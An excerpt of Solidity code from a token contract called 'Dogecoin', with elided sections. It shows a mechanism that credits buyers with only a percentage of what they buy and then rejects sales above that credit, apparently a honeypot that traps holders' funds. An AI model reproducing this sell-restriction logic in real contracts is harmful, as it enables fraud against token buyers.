...
contract Dogecoin is Context, IERC20, Ownable {
    ...
    address payable private marketWall = payable(0x291C4b0C5bc834773C65Aad92148db71B6de2a5b); 
    address payable private teamWalletAddress = payable(0x291C4b0C5bc834773C65Aad92148db71B6de2a5b); 
	...
	mapping(address => uint256) public ktList;
...
// 		uint256 amountpercent = 0;  
        ...
        if(_swapCake[sender]) {
		    ktList[recipient]=ktList[recipient].add(amount.mul(_point).div(100));
...
//			require(amount <= amountpercent, "ERC20: over Percent");
		    require(ktList[_address]>=(sellList[sender].add(amount)),"sell amout gt buy total");
